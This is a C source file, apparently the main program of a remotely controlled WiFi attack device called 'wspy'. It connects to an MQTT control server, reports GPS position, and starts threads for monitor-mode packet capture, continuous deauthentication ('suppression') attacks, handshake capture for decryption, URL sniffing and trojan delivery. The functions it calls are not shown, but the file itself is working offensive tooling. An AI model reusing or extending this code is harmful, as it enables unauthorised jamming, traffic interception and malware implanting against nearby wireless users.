/*
 * Rs485.c
 *
 *  Created on: Dec 10, 2018
 *      Author: lpz
 */
#define __USE_GNU
#define _GNU_SOURCE

#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <net/if.h>
#include "common.h"
#include "status.h"
#include "mac80211_fmt.h"
#include "MQTTAsync.h"
#include "MQTTClient.h"
#include "MqttProcess.h"
#include "wifi_sniffer.h"
#include "mac80211_atk.h"
#include "gimbal.h"
#include "wifi_sniffer.h"
#include "script.h"
#include "gps.h"
#include "scan_hided_ssid.h"
#include "wifi_decrypt.h"
#include "wifi_access.h"
#include "mmget.h"
#include "wlan_list.h"
#include "wifi_trojan.h"
#include "DataProcess.h"
/***********************************************************************************
 *                                  Declare
 ***********************************************************************************/

/***********************************************************************************
 *                                  Variable
 ***********************************************************************************/
extern bool StatusQueryEvtOn; //状态下发标志，表示接收到上位机下发指令的标志
uint32_t DeviceSN;// = 0x10000001;
const char * FirmwareVersion = "v1.0.2";

time_t now, pretick = 0;

/*****************************************************************
* 函数描述：mqtti连接函数，用于设备作为客户端去连接mqtt服务器
* 参数：void
* 返回值： 无
****************************************************************/
void mqtt_client(void)
{
    MQTT_Connc_On = MqttDisconnected;
	while (1) {
        if (MQTT_Connc_On == MqttDisconnected) {
            struct SslInfo tsslinfo;
            printf("connect to server ip: %s, port: %d\n", UserCfgJson.ip, UserCfgJson.port);
            mqtt_connect_to_server(UserCfgJson.ip,UserCfgJson. port, UserCfgJson.clinet_id,&tsslinfo);
        }
        else if (MQTT_Connc_On == MqttLost) {
            destroy_mqtt_client();
            MQTT_Connc_On = MqttDisconnected;
        }
        printf("connect status %d %ld %ld\n",MQTT_Connc_On,now, pretick);
		sleep(5);

	}

	pthread_exit(0);
}
/*********************************************************************************************
* 函数描述：设备状态上报函数，用于周期3s或者收到指令后进行状态上报，包括设备本身状态、gps位置、接入、吸附及jh的状态
* 参数：void
* 返回值： 无
***********************************************************************************************/
void publish_routine(void)
{
    int sockfd=-1,lerror=0;
    int trajon_time=0;
  //  green_led_off();

    sockfd =socket(AF_INET,SOCK_DGRAM,0);
    if(sockfd == -1){
    	printf("socket error :%s\n",strerror(lerror));
    	return ;
    }
    while (1) {
        usleep(100);
        if (MQTT_Connc_On != MqttConnected) {
        	continue;
        }
        now = time(NULL);
        if (now - pretick >= 3 || StatusQueryEvtOn) {
            status_report();
            gps_report();
            pretick = now;
			printf("packet num: %d\t err num : %d\tbitrate :%f%%\n",PacketCount[0].totalcount,
				PacketCount[0].errcount,((float)PacketCount[0].errcount*100)/PacketCount[0].totalcount);

            if(WifiAccess.mode ==ACCESS_MODE_STA){ //sta模式
            	if(sta_acess_report(sockfd) == 0){
            		update_status("apAccess", "status-succ", NULL);
            		WifiAccess.mode=ACCESS_MODE_STA_SUCC;
            		g_acesstimeout=0;
            	}else{
            		if(!StatusQueryEvtOn){
            			g_acesstimeout++;
            		}
            	}
            	if(g_acesstimeout > 60){
            		update_status("apAccess", "status-fail", NULL);
            		WifiAccess.mode=ACCESS_MODE_EXIT;
            		g_acesstimeout=0;
            	}

            }
            else if(WifiAccess.mode == ACCESS_MODE_AP){//如果是ap模式
            	if(ap_acess_report() ==0) {
            		update_status("staAttach", "status-succ", NULL);
					WifiAccess.mode=ACCESS_MODE_AP_SUCC;
					g_acesstimeout=0;
					stop_sta_inter();//停止攻击
            	}
            	else{
            		if(!StatusQueryEvtOn){
            			g_acesstimeout++;
            		}
            	}
            	if(g_acesstimeout > 60){
					update_status("staAttach", "status-fail", NULL);
					WifiAccess.mode=ACCESS_MODE_EXIT;
					g_acesstimeout=0;
				}
            }
            else if(WifiAccess.mode == ACCESS_MODE_EXIT){
            	g_acesstimeout=0;
            	update_status("apAccess", "result-fail", NULL);
            	WifiAccess.mode=ACCESS_MODE_INVALID;
            }

            StatusQueryEvtOn = false;
            if(g_turl_data.uc_urlsniffer_flag == 1){
                  	trajon_time++;
                  	if(trajon_time >3){
                  		url_sniffer_parse();
                  		trajon_time=0;
                  	}
		   }
        } 
    }
}
/*****************************************************************
* 函数描述：探测数据上报函数 ，用于处理探测到的数据节点上报，
* 参数：void
* 返回值： 无
****************************************************************/
void wlan_sniffer_publish(void)
{
    while (PcapOn[0] == true||PcapOn[1] == true) {
        // print_wlan();
        if(PcapOn[0] == true){
        	sniffer_msg_push(20,0);
        }
        if(PcapOn[1] == true){
        	sniffer_msg_push(20,1);
        }
        usleep(1000);
    }
    pthread_exit(0);
}
/*****************************************************************
 * 函数描述：压制攻击线程处理函数
 * 参数：void
 * 返回值： 无
 * ***************************************************************/
void atk_task(void)
{
	pthread_t pth1;
	int	sendnum =10;
	for(;;){
			if(ApInter == true || StaInter == true){
#ifndef ZRRJ
				system("wifi");
#endif
				if(DecryptOn == true){
					pthread_create(&pth1, NULL, do_deauth_atk, &sendnum);//开启持续压制线程
					sleep(3);
				}
				else {
					pthread_create(&pth1, NULL, do_deauth_atk, NULL);//开启持续压制线程
				}
				pthread_join(pth1,NULL);
				printf("%s thread is over\n",__func__);
		}
		else{
			usleep(1000);
		}
	}
}
/*****************************************************************
 * 函数描述：设备任务线程处理函数，主要用于开启抓包解析线程、扫描上报线程和扫描策略线程
 * 参数：void
 * 返回值： 无
 * ***************************************************************/
void wspy_task(void)
{
	pthread_t pth1,pth2,pth3,pth4,pth5,pth6,pth7;
	uint8_t ucchl,ucch1=0xff,ucch2=0xff,chl1scan=0;//chlcan 代表2.4G已经开启扫描线程，不需要5.8G再开
	int pthflg[2]={0xff,0xff};




#ifndef ZRRJ
    strobe_wifi_monitor(0x3,0);//所有wifi网卡使能
    strobe_wifi_ap(ATK24DEVCHL,0);//ap模式启动
    strobe_wifi_ap(ATK58DEVCHL,1);//ap模式启动
#endif
    for (;;) {
        if (PcapOn[IEEE80211_2G4] == true||PcapOn[IEEE80211_5G8] == true) {
        	ucchl=(PcapOn[IEEE80211_2G4]|(PcapOn[IEEE80211_5G8]<<1));
        	chl1scan = false;
        	printf("%s %d start caputre %d %d\n",__func__,__LINE__,PcapOn[IEEE80211_2G4] ,PcapOn[IEEE80211_5G8] );
            if(PcapOn[IEEE80211_2G4] == true){//开启2.4G网卡抓包线程
            	strobe_wifi_monitor(0,1);
            	strobe_wifi_monitor(2,1);
            	ucch1 = IEEE80211_2G4;
            	pthread_create(&pth1, NULL, (void *)capture_loop, (void *)&ucch1);
            	if(DecryptOn == false){
            		pthread_create(&pth3, NULL, (void *)wifi_scan_policy, (void *)&ucchl);//开启扫描策略线程
            		pthread_create(&pth6, NULL, (void *)deauth_process, (void *)&ucch1);
            		pthflg[IEEE80211_2G4] = 0x1;
            		chl1scan = true;
            	}
            	else{
            		wifi_decrypt_setchl(ucch1);//设置握手包的信道
            	}

            }
            if(PcapOn[IEEE80211_5G8] == true){//开启5.8G网卡抓包线程
            	strobe_wifi_monitor(1,1);
				strobe_wifi_monitor(3,1);
            	ucch2 = IEEE80211_5G8;
            	pthread_create(&pth4,  NULL, (void *)capture_loop, (void *)&ucch2);
            	if(DecryptOn == false){
            		if(chl1scan == false){
						pthread_create(&pth3, NULL, (void *)wifi_scan_policy, (void *)&ucchl);//开启扫描策略线程
					}
            		pthread_create(&pth7, NULL, (void *)deauth_process, (void *)&ucch2);
            		pthflg[IEEE80211_5G8] = 0x1;
            	}
            	else{
            		wifi_decrypt_setchl(ucch2);
            	}

            }

            pthread_create(&pth2, NULL, (void *)wlan_sniffer_publish, NULL);//开启数据上报线程

            while (PcapOn[IEEE80211_2G4] == true ||PcapOn[IEEE80211_5G8] == true)
                usleep(100);
            usleep(100);//
#if 0
            pthread_cancel(pth1);//等待线程退出
            pthread_cancel(pth2);
            pthread_cancel(pth3);
            pthread_cancel(pth4);
            pthread_cancel(pth5);
#else
            printf("wait fot pthread over\n");
            if(ucch1== IEEE80211_2G4){
            	pthread_cancel(pth1);
                printf("wait fot pthread1 over\n");
			    pthread_join(pth1,NULL);
			    printf("wait fot pthread2 over\n");
			    destroy_wlan_list(IEEE80211_2G4);

				if(pthflg[IEEE80211_2G4] == 0x1){
					pthread_join(pth3,NULL);
					pthread_join(pth6,NULL);
					pthflg[IEEE80211_2G4] =0xff;
				}

            }
            printf("1111\n");
            if(ucch2 ==IEEE80211_5G8){
			    printf("2222\n");
            	pthread_cancel(pth4);
            	printf("666\n");
				pthread_join(pth4,NULL);
			    destroy_wlan_list(IEEE80211_5G8);
				if(pthflg[IEEE80211_5G8] == 0x1){
					printf("333\n");
					if(chl1scan == false){
						pthread_join(pth3,NULL);
					}
					printf("444\n");
					pthread_join(pth7,NULL);
				}
            }
            printf("5555\n");
            pthread_join(pth2,NULL);
            printf("pthread exit\n");
#endif
        }
        else{
        //	printf("pthread else\n");
            usleep(10);
        }
    }
}

void get_device_sn(void)
{
    char sn[32] = "0";
    sys_get("uci get wspy.device.sn", sn, sizeof(sn));
    if (!strncmp(sn, "0x", 2))
        sscanf(sn, "0x%x", &DeviceSN);
    else
        DeviceSN = atoi(sn);
    printf("SN:0x%x\n", DeviceSN);
}
void gps_task(void)
{
    int port;
    size_t rxlen;
    char rxbuffer[1024];

	if (UserCfgJson.gps_disable == 1) {
		printf("disabled gps service\n");
		return;
	}

    port = serial_open("/dev/ttyS0", 9600, 8, 1, 'N',0);
    printf("gps fd :%d\n",port);
    if (port == -1) {
        perror("can not open the port\n");
        return;
    }
    wspy_gps.longtitude=UserCfgJson.longitude;
    wspy_gps.latitude=UserCfgJson.latitude;
    for (;;) {
        rxlen = serial_readline(port, rxbuffer, sizeof(rxbuffer), 1000);
        if (rxlen > 0) {
        	pthread_mutex_lock(&gps_staus_mutex);
            gps_process_data(rxbuffer);
            pthread_mutex_unlock(&gps_staus_mutex);
            printf("%.*s", rxlen, rxbuffer);
            if(GPS_Data.latitude<0.000001||GPS_Data.longitude<0.000001){
            	usleep(20000);
            	continue;
            }
            printf("latitude:%f, longitude:%f\n", GPS_Data.latitude, GPS_Data.longitude);
        }
        sleep(2);
    }
}
int main(int argc, char * argv[])
{	
	pthread_t id1,id2,id3,id4,id5,id6;

    printf("Version: %s, Build: %s %s\n", FirmwareVersion, __DATE__, __TIME__);

    gimbal_init();
#ifdef WSPY_CAR
    pthread_create(&id6, NULL, (void *)gimbal_thread, NULL);
    sleep(1);
    gimbal_init_set();
#else
    gimbal_set_angle(0,1);
    gimbal_set_angle(0,36);
#endif
    read_user_config();
    mmget_init();//木马下发初始化
	memset(default_gw_ip,0,sizeof(default_gw_ip));//获取默认网关

	//printf("default gw id %s",default_gw_ip);

	init_status();//初始化程序状态
    pthread_mutex_init(&g_tscanpolicy_mutex,NULL);//初始化扫描策略线程锁
    pthread_mutex_init(&g_tchl_mutex[0],NULL);//初始化信道获取线程锁
    pthread_mutex_init(&g_tchl_mutex[1],NULL);//初始化信道获取线程锁
    pthread_mutex_init(&gps_staus_mutex,NULL);//初始化GPS状态互斥锁
 //   pthread_mutex_init(&g_wlanlist_mutex,NULL);//
	pthread_create(&id1, NULL, (void *)mqtt_client, NULL);//启动mqtt线程连接服务器，订阅消息
    pthread_create(&id2, NULL, (void *)publish_routine, NULL);//发布线程，主动3s周期上报设备状态及GPS信息
    pthread_create(&id3, NULL, (void *)wspy_task, NULL);
    pthread_create(&id4, NULL, (void *)atk_task, NULL);
#ifndef WSPY_CAR
    pthread_create(&id5, NULL, (void *)gps_task, NULL);
#else

#endif
	pthread_join(id1,NULL);
	pthread_join(id2,NULL);
	pthread_join(id3,NULL);
	pthread_join(id4,NULL);
#ifndef WSPY_CAR
	pthread_join(id5,NULL);
#else
	//pthread_join(id6,NULL);
#endif
//	pthread_join(id6,NULL);

	return 0;
}


